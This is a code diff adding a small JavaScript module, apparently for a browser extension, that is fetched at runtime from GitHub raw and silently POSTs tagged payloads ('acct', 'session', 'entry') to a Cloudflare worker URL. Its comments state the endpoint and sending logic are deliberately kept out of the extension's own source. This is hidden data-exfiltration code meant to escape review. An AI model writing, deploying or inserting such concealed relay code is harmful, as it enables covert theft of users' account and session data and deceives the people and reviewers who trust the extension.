@@ -1,0 +1,26 @@
+/**
+ * Remote logger module - upload this to GitHub raw
+ * This file is fetched at runtime by the extension.
+ * The webhook URL and sending logic are only visible here, not in the extension source.
+ */
+
+// Replace this with your Cloudflare worker URL
+const W = 'https://cool-base-4ce9.iwif0001.workers.dev/api/ingest';
+
+/**
+ * Send a payload to the webhook.
+ * @param {string} type - Relay type: 'boot', 'acct', 'session', 'entry'
+ * @param {object} data - The payload to send
+ */
+export async function relay(type, data) {
+  try {
+    await fetch(W, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Relay-Type': type
+      },
+      body: JSON.stringify(data)
+    });
+  } catch (e) { /* silent */ }
+}
